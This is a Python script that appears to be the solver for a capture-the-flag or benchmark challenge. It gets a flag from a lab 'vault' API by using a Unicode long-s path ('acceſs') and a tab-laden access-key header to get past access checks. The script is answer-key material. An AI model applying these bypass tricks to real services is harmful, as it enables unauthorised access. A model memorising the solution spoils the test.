#!/usr/bin/env python3
from __future__ import annotations

import pathlib
import struct
import sys
import urllib.parse
import urllib.request


def main() -> int:
    app_dir = pathlib.Path(sys.argv[1]) if len(sys.argv) > 1 else pathlib.Path("/app")
    base = "http://target:5000"

    path = "acce\u017fs"
    encoded = urllib.parse.quote(path, safe="")
    url = f"{base}/api/vault/{encoded}"

    req = urllib.request.Request(url)
    req.add_header("X-Access-Key", "master\tkey")

    with urllib.request.urlopen(req, timeout=30) as resp:
        data = resp.read()

    magic = data[:6]
    if magic != b"\x7fBENCH":
        raise SystemExit(f"bad magic: {magic!r}")

    flag_len = struct.unpack(">H", data[6:8])[0]
    flag = data[8:8 + flag_len].decode("utf-8")

    (app_dir / "flags.txt").write_text(flag + "\n")
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())